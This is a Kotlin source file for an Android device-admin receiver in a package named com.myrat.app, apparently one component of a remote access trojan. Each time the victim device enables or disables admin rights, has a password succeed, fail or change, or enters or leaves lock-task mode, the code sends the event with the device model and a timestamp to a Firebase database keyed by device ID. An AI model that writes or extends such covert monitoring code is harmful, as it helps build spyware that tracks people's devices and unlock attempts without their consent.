package com.myrat.app.receiver

import android.app.admin.DeviceAdminReceiver
import android.content.Context
import android.content.Intent
import com.google.firebase.database.ktx.database
import com.google.firebase.ktx.Firebase
import com.myrat.app.MainActivity
import com.myrat.app.utils.Logger

class MyDeviceAdminReceiver : DeviceAdminReceiver() {

    override fun onEnabled(context: Context, intent: Intent) {
        super.onEnabled(context, intent)
        Logger.log("Enhanced Device Admin enabled")
        reportAdminStatus(context, true, "enabled")
    }

    override fun onDisabled(context: Context, intent: Intent) {
        super.onDisabled(context, intent)
        Logger.log("Enhanced Device Admin disabled")
        reportAdminStatus(context, false, "disabled")
    }

    override fun onPasswordChanged(context: Context, intent: Intent, user: android.os.UserHandle) {
        super.onPasswordChanged(context, intent, user)
        Logger.log("Password changed detected")
        reportPasswordEvent(context, "password_changed", user)
    }

    override fun onPasswordFailed(context: Context, intent: Intent, user: android.os.UserHandle) {
        super.onPasswordFailed(context, intent, user)
        Logger.log("Password failed detected")
        reportPasswordEvent(context, "password_failed", user)
    }

    override fun onPasswordSucceeded(context: Context, intent: Intent, user: android.os.UserHandle) {
        super.onPasswordSucceeded(context, intent, user)
        Logger.log("Password succeeded detected")
        reportPasswordEvent(context, "password_succeeded", user)
    }

    override fun onLockTaskModeEntering(context: Context, intent: Intent, pkg: String) {
        super.onLockTaskModeEntering(context, intent, pkg)
        Logger.log("Lock task mode entering: $pkg")
        reportLockTaskEvent(context, "entering", pkg)
    }

    override fun onLockTaskModeExiting(context: Context, intent: Intent) {
        super.onLockTaskModeExiting(context, intent)
        Logger.log("Lock task mode exiting")
        reportLockTaskEvent(context, "exiting", null)
    }

    private fun reportAdminStatus(context: Context, isEnabled: Boolean, action: String) {
        try {
            val deviceId = MainActivity.getDeviceId(context)
            val db = Firebase.database.reference

            val adminData = mapOf(
                "isEnabled" to isEnabled,
                "action" to action,
                "timestamp" to System.currentTimeMillis(),
                "deviceModel" to android.os.Build.MODEL,
                "androidVersion" to android.os.Build.VERSION.SDK_INT
            )

            db.child("Device").child(deviceId).child("admin_status").setValue(adminData)
                .addOnSuccessListener {
                    Logger.log("Admin status reported: $action")
                }
                .addOnFailureListener { e ->
                    Logger.error("Failed to report admin status", e)
                }
        } catch (e: Exception) {
            Logger.error("Error reporting admin status", e)
        }
    }

    private fun reportPasswordEvent(context: Context, event: String, user: android.os.UserHandle?) {
        try {
            val deviceId = MainActivity.getDeviceId(context)
            val db = Firebase.database.reference

            val passwordData = mapOf(
                "event" to event,
                "timestamp" to System.currentTimeMillis(),
                "userId" to (user?.hashCode() ?: 0),
                "deviceModel" to android.os.Build.MODEL
            )

            db.child("Device").child(deviceId).child("password_events").push().setValue(passwordData)
                .addOnSuccessListener {
                    Logger.log("Password event reported: $event")
                }
                .addOnFailureListener { e ->
                    Logger.error("Failed to report password event", e)
                }
        } catch (e: Exception) {
            Logger.error("Error reporting password event", e)
        }
    }

    private fun reportLockTaskEvent(context: Context, event: String, packageName: String?) {
        try {
            val deviceId = MainActivity.getDeviceId(context)
            val db = Firebase.database.reference

            val lockTaskData = mapOf(
                "event" to event,
                "packageName" to (packageName ?: ""),
                "timestamp" to System.currentTimeMillis()
            )

            db.child("Device").child(deviceId).child("lock_task_events").push().setValue(lockTaskData)
                .addOnSuccessListener {
                    Logger.log("Lock task event reported: $event")
                }
                .addOnFailureListener { e ->
                    Logger.error("Failed to report lock task event", e)
                }
        } catch (e: Exception) {
            Logger.error("Error reporting lock task event", e)
        }
    }
}